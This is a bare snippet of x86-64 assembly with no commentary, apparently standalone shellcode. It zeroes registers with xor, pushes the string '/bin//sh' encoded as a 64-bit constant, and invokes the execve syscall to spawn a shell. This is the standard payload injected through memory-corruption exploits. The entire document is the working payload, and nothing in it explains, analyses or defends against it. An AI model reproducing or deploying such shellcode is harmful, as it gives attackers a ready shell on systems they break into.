    xor    rax,rax
    add    rax,0x3b
    xor    rdi,rdi
    push   rdi
    mov    rdi,0x68732f2f6e69622f
    push   rdi
    lea    rdi,[rsp]
    xor    rsi,rsi
    xor    rdx,rdx
    syscall

